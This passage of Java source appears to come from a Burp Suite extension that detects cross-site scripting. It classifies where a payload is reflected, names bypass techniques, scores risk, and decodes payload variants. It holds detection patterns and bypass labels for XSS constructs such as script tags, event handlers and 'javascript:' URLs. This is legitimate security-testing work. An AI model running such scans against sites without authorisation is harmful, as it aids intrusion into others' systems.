                    while (valueStart < context.length() && (context.charAt(valueStart) == ' ' || 
                           context.charAt(valueStart) == '"' || context.charAt(valueStart) == '\'')) {
                        valueStart++;
                    }
                    int valueEnd = findAttributeValueEnd(context, valueStart);
                    if (relativePayloadIndex >= valueStart && relativePayloadIndex < valueEnd) {
                        return "EVENT_HANDLER_EXECUTION";
                    }
                }
            }
            
            // Check for HTML attribute context
            Pattern attrPattern = Pattern.compile(
                "<[^>]*\\s+(href|src|action|formaction|on\\w+)\\s*=\\s*([\"']?)\\s*[^\"'>]*" + 
                Pattern.quote(payload) + "[^\"'>]*", 
                Pattern.CASE_INSENSITIVE
            );
            if (attrPattern.matcher(context).find()) {
                return "HTML_ATTRIBUTE";
            }
            
            // Check for HTML tag context
            if (context.matches(".*<[^>]*" + Pattern.quote(payload) + "[^>]*>.*")) {
                return "HTML_TAG";
            }
            
            // Check for URL context
            if (context.contains("javascript:") || context.contains("data:") || context.contains("vbscript:")) {
                return "URL_EXECUTION";
            }
            
            // Default to HTML body
            return "HTML_BODY";
            
        } catch (Exception e) {
            return "UNKNOWN";
        }
    }
    
    /**
     * CRITICAL FIX: Extract response snippet showing payload location
     */
    private String extractResponseSnippet(String response, String payload, int contextSize) {
        try {
            if (response == null || payload == null) return null;
            
            int payloadIndex = response.indexOf(payload);
            if (payloadIndex == -1) return null;
            
            int start = Math.max(0, payloadIndex - contextSize);
            int end = Math.min(response.length(), payloadIndex + payload.length() + contextSize);
            
            String snippet = response.substring(start, end);
            snippet = snippet.replace(payload, "<<<PAYLOAD>>>" + payload + "<<<END>>>");
            
            return snippet;
        } catch (Exception e) {
            return null;
        }
    }
    
    /**
     * CRITICAL FIX: Analyze attack vector
     */
    private String getAttackVector(String payload) {
        if (payload.contains("<script>")) return "Script Tag Injection";
        if (payload.contains("onerror") || payload.contains("onload")) return "Event Handler Injection";
        if (payload.contains("javascript:")) return "Protocol Handler Injection";
        if (payload.contains("eval(")) return "Code Evaluation";
        if (payload.contains("setTimeout")) return "Asynchronous Execution";
        return "Generic XSS";
    }
    
    /**
     * CRITICAL FIX: Identify bypass techniques
     */
    private String getBypassTechniques(String payload) {
        List<String> techniques = new ArrayList<>();
        
        if (payload.matches(".*[A-Z].*[a-z].*")) techniques.add("Case Variation");
        if (payload.contains(" ") || payload.contains("\t")) techniques.add("Whitespace Insertion");
        if (payload.contains("/*") || payload.contains("//")) techniques.add("Comment Injection");
        if (payload.contains("%") || payload.contains("&#")) techniques.add("Encoding Variation");
        if (payload.contains("String.fromCharCode")) techniques.add("Character Code Conversion");
        if (payload.matches(".*\\[.*\\].*\\(.*\\).*")) techniques.add("Bracket Notation");
        
        return techniques.isEmpty() ? "Standard Injection" : String.join(", ", techniques);
    }
    
    private int calculateRiskScore(AdvancedResponseAnalysis analysis) {
        int score = 0;
        
        if (analysis.isDirectReflection()) score += 30;
        if (analysis.isJavaScriptExecution()) score += 40;
        if (analysis.isContextVulnerable()) score += 20;
        if (analysis.isDomManipulation()) score += 10;
        
        return Math.min(100, score);
    }
    
    private String assessBusinessImpact(AdvancedResponseAnalysis analysis) {
        if (analysis.isJavaScriptExecution()) return "High - Script execution possible";
        if (analysis.isContextVulnerable()) return "Medium - Context manipulation possible";
        if (analysis.isDirectReflection()) return "Medium - Direct reflection confirmed";
        return "Low - Limited exploitation potential";
    }
    
    private String calculateRemediationPriority(AdvancedResponseAnalysis analysis) {
        if (analysis.getConfidence() > 90) return "Critical - Immediate fix required";
        if (analysis.getConfidence() > 70) return "High - Fix within 24 hours";
        if (analysis.getConfidence() > 50) return "Medium - Fix within 1 week";
        return "Low - Fix within 1 month";
    }

    private boolean containsAnyIgnoreCase(String haystack, List<String> needles) {
        if (haystack == null || haystack.isEmpty() || needles == null || needles.isEmpty()) return false;
        String h = haystack.toLowerCase();
        for (String n : needles) {
            if (n == null || n.isEmpty()) continue;
            if (h.contains(n.toLowerCase())) return true;
        }
        return false;
    }

    /**
     * Build candidate strings that may appear in the response when the injected value is decoded/normalized.
     */
    /**
     * ADVANCED: Build comprehensive reflection candidates with all decoded variants
     * This ensures we detect payload reflection even if server decodes it
     */
    private List<String> buildReflectionCandidates(String injected) {
        List<String> out = new ArrayList<>();
        if (injected == null || injected.isEmpty()) return out;
        
        // Always include original
        out.add(injected);

        // STEP 1: URL decode 1x, 2x, and 3x (some servers decode multiple times)
        try {
            String d1 = helpers.urlDecode(injected);
            if (d1 != null && !d1.equals(injected)) {
                out.add(d1);
                
                // Double URL decode
                String d2 = helpers.urlDecode(d1);
                if (d2 != null && !d2.equals(d1)) {
                    out.add(d2);
                    
                    // Triple URL decode (rare but possible)
                    String d3 = helpers.urlDecode(d2);
                    if (d3 != null && !d3.equals(d2)) {
                        out.add(d3);
                    }
                }
            }
        } catch (Exception ignored) {}

        // STEP 2: HTML entity decode (comprehensive set)
        String htmlDecoded = injected
            .replace("&lt;", "<")
            .replace("&gt;", ">")
            .replace("&quot;", "\"")
            .replace("&#34;", "\"")
            .replace("&#x22;", "\"")
            .replace("&#39;", "'")
            .replace("&#x27;", "'")
            .replace("&amp;", "&")
            .replace("&#38;", "&")
            .replace("&#x26;", "&")
            .replace("&#60;", "<")
            .replace("&#x3c;", "<")
            .replace("&#x3C;", "<")
            .replace("&#62;", ">")
            .replace("&#x3e;", ">")
            .replace("&#x3E;", ">");
        if (!htmlDecoded.equals(injected)) {
            out.add(htmlDecoded);
            
            // Also try URL-decoding the HTML-decoded version
            try {
                String htmlThenUrlDecoded = helpers.urlDecode(htmlDecoded);
                if (htmlThenUrlDecoded != null && !htmlThenUrlDecoded.equals(htmlDecoded)) {
                    out.add(htmlThenUrlDecoded);
                }
            } catch (Exception ignored) {}
        }

        // STEP 3: JSON/unicode decode for common safe-escapes
        String unicodeDecoded = htmlDecoded
            .replace("\\u003c", "<")
            .replace("\\u003C", "<")
            .replace("\\u003e", ">")
            .replace("\\u003E", ">")
            .replace("\\u0026", "&")
            .replace("\\u0022", "\"")
            .replace("\\u0027", "'")
            .replace("\\u0020", " ")
            .replace("\\u000a", "\n")
            .replace("\\u000d", "\r")
            .replace("\\u0009", "\t");
        if (!unicodeDecoded.equals(htmlDecoded)) {
            out.add(unicodeDecoded);
        }
        
        // Also decode from original injected string
        String unicodeDecodedFromOriginal = injected
            .replace("\\u003c", "<")
            .replace("\\u003C", "<")
            .replace("\\u003e", ">")
            .replace("\\u003E", ">")
            .replace("\\u0026", "&")
            .replace("\\u0022", "\"")
            .replace("\\u0027", "'");
        if (!unicodeDecodedFromOriginal.equals(injected)) {
            out.add(unicodeDecodedFromOriginal);
        }

        // STEP 4: JSON escape decode
        String jsonDecoded = injected
            .replace("\\\"", "\"")
            .replace("\\\\", "\\")
            .replace("\\n", "\n")
            .replace("\\r", "\r")
            .replace("\\t", "\t")
            .replace("\\/", "/")
            .replace("\\b", "\b")
            .replace("\\f", "\f");
        if (!jsonDecoded.equals(injected)) {
            out.add(jsonDecoded);
            
            // Also try URL-decoding the JSON-decoded version
            try {
                String jsonThenUrlDecoded = helpers.urlDecode(jsonDecoded);
                if (jsonThenUrlDecoded != null && !jsonThenUrlDecoded.equals(jsonDecoded)) {
                    out.add(jsonThenUrlDecoded);
                }
            } catch (Exception ignored) {}
        }

        // STEP 5: Hex decode (for hex-encoded payloads)
        try {
            // Check if string contains hex patterns like \x3c, \x3e
            if (injected.contains("\\x")) {
                String hexDecoded = injected
                    .replace("\\x3c", "<")
                    .replace("\\x3C", "<")
                    .replace("\\x3e", ">")
                    .replace("\\x3E", ">")
                    .replace("\\x22", "\"")
                    .replace("\\x27", "'")
                    .replace("\\x26", "&");
                if (!hexDecoded.equals(injected)) {
                    out.add(hexDecoded);
                }
            }
        } catch (Exception ignored) {}
        
        // STEP 5b: Base64 decode (for Base64-encoded payloads in data URIs)
        try {
            // Check for data:text/html;base64, or just base64 strings
            if (injected.contains("base64,")) {
                int base64Start = injected.indexOf("base64,") + 7;
                if (base64Start < injected.length()) {
                    String base64Part = injected.substring(base64Start);
                    // Try to decode Base64
                    try {
                        byte[] decoded = java.util.Base64.getDecoder().decode(base64Part);
                        String base64Decoded = new String(decoded, StandardCharsets.UTF_8);
                        if (!base64Decoded.equals(injected)) {
                            out.add(base64Decoded);
                        }
                    } catch (Exception e) {
                        // Not valid Base64, try extracting just the Base64 part
                        String[] parts = base64Part.split("[^A-Za-z0-9+/=]");
                        for (String part : parts) {
                            if (part.length() > 10) { // Reasonable Base64 length
                                try {
                                    byte[] decoded = java.util.Base64.getDecoder().decode(part);
                                    String decodedStr = new String(decoded, StandardCharsets.UTF_8);
                                    if (decodedStr.contains("<") || decodedStr.contains("script")) {
                                        out.add(decodedStr);
                                    }
                                } catch (Exception ignored) {}
                            }
                        }
                    }
                }
            }
        } catch (Exception ignored) {}

        // STEP 6: Remove duplicates while preserving order
        List<String> uniqueCandidates = new ArrayList<>();
        for (String candidate : out) {
            if (candidate != null && !uniqueCandidates.contains(candidate)) {
                uniqueCandidates.add(candidate);
            }
        }
        
        return uniqueCandidates;
    }
}

/**
 * Advanced Response Analysis Result Container
 */
class AdvancedResponseAnalysis {
    private boolean directReflection = false;
    private boolean encodedReflection = false;
    private boolean contextVulnerable = false;
    private boolean javaScriptExecution = false;
    private boolean domManipulation = false;
    private List<String> evidence = new ArrayList<>();
    private double confidence = 0.0;
    
    public void calculateConfidence() {
        confidence = 0.0;
        
        // More sensitive confidence calculation
        if (directReflection) confidence += 40.0;
        if (encodedReflection) confidence += 25.0;
        if (contextVulnerable) confidence += 30.0;
        if (javaScriptExecution) confidence += 25.0;
        if (domManipulation) confidence += 10.0;
        
        // Bonus for multiple evidence types
        int evidenceTypes = 0;
        if (directReflection) evidenceTypes++;
        if (encodedReflection) evidenceTypes++;
        if (contextVulnerable) evidenceTypes++;
        if (javaScriptExecution) evidenceTypes++;
        if (domManipulation) evidenceTypes++;
        
        if (evidenceTypes > 1) {
            confidence += evidenceTypes * 5.0; // Bonus for multiple indicators
        }
        
        // CRITICAL: Only set minimum confidence if we have actual evidence
        // Do not set confidence for minimal evidence - require real proof
        if (evidence.size() > 0 && confidence == 0.0) {
            // Only set minimum if we have actual reflection evidence
            if (directReflection || encodedReflection || contextVulnerable) {
                confidence = 15.0; // Minimum confidence only for actual reflection
            }
        }
        
        confidence = Math.min(95.0, confidence);
    }
    
    public boolean isVulnerable() {
        return directReflection || encodedReflection || contextVulnerable;
    }
    
    public String getVulnerabilityType() {
        if (javaScriptExecution) return "Stored/Reflected XSS with JavaScript Execution";
        if (contextVulnerable) return "Context-specific XSS";
        if (directReflection) return "Direct Reflection XSS";
        return "Potential XSS";
    }
    
    public String getExploitationDifficulty() {
        if (confidence > 80) return "Trivial";
        if (confidence > 60) return "Easy";
        if (confidence > 40) return "Moderate";
        return "Difficult";
    }
    
    // Getters and setters
    public boolean isDirectReflection() { return directReflection; }
    public void setDirectReflection(boolean directReflection) { this.directReflection = directReflection; }
    
    public boolean isEncodedReflection() { return encodedReflection; }
    public void setEncodedReflection(boolean encodedReflection) { this.encodedReflection = encodedReflection; }
    
    public boolean isContextVulnerable() { return contextVulnerable; }
    public void setContextVulnerable(boolean contextVulnerable) { this.contextVulnerable = contextVulnerable; }
    
    public boolean isJavaScriptExecution() { return javaScriptExecution; }
    public void setJavaScriptExecution(boolean javaScriptExecution) { this.javaScriptExecution = javaScriptExecution; }
    
    public boolean isDomManipulation() { return domManipulation; }
    public void setDomManipulation(boolean domManipulation) { this.domManipulation = domManipulation; }
    
    public List<String> getEvidence() { return evidence; }
    public void addEvidence(String evidence) { this.evidence.add(evidence); }
    
    public double getConfidence() { return confidence; }
    public void setConfidence(double confidence) { this.confidence = confidence; }
    
    // ADVANCED: Additional fields for browser execution context
    private String vulnerabilityType = null;
    private String exploitationDifficulty = null;
    private String reflectionContext = null;
    
    public void setVulnerabilityType(String type) { this.vulnerabilityType = type; }
    public void setExploitationDifficulty(String difficulty) { this.exploitationDifficulty = difficulty; }
    public void setReflectionContext(String context) { this.reflectionContext = context; }
    public String getReflectionContext() { return reflectionContext; }
    
    // Override existing methods to use custom values if set
    public String getVulnerabilityTypeCustom() {
        if (vulnerabilityType != null) return vulnerabilityType;
        // Fallback to original logic
        return getVulnerabilityType();
    }
    
    public String getExploitationDifficultyCustom() {
        if (exploitationDifficulty != null) return exploitationDifficulty;
        // Fallback to original logic
        return getExploitationDifficulty();
    }
}

/**
 * Wrapper class for creating IHttpRequestResponse from actual request/response data
 * Used for wrapping real HTTP responses for analysis
 */
class SimpleHttpRequestResponseWrapper implements IHttpRequestResponse {
    private final byte[] request;
    private final byte[] response;
    private final IHttpService httpService;
    
    public SimpleHttpRequestResponseWrapper(byte[] request, byte[] response, IHttpService httpService) {
        this.request = request;
        this.response = response;
        this.httpService = httpService;
    }
    
    @Override
    public byte[] getRequest() { return request; }
    
    @Override
    public void setRequest(byte[] message) { /* Read-only */ }
    
    @Override
    public byte[] getResponse() { return response; }
    
    @Override
    public void setResponse(byte[] message) { /* Read-only */ }
    
    @Override
    public String getComment() { return null; }
    
    @Override
    public void setComment(String comment) { /* Read-only */ }
    
    @Override
    public String getHighlight() { return null; }
    
    @Override
    public void setHighlight(String color) { /* Read-only */ }
    
    @Override
    public IHttpService getHttpService() { return httpService; }
    
    @Override
    public void setHttpService(IHttpService httpService) { /* Read-only */ }
}